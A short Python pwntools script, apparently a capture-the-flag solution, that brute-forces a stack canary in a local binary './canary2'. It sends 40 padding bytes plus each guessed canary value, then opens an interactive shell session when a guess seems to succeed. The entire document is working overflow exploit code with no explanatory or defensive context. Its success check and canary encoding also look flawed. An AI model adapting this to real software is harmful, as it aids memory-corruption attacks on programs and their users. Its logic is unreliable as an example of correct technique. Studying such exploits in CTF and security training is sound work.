from pwn import *
from Crypto.Util.number import long_to_bytes

for canary in range(0x100000000):
    try:
        p = process("./canary2")
        p.recvline()

        payload = b"a" * 40 + long_to_bytes(canary) + b"\x01"
        p.sendline(payload)

        p.recvall()
        fail = False
    except Exception:
        fail = True
    finally:
        if not fail:
            p.interactive()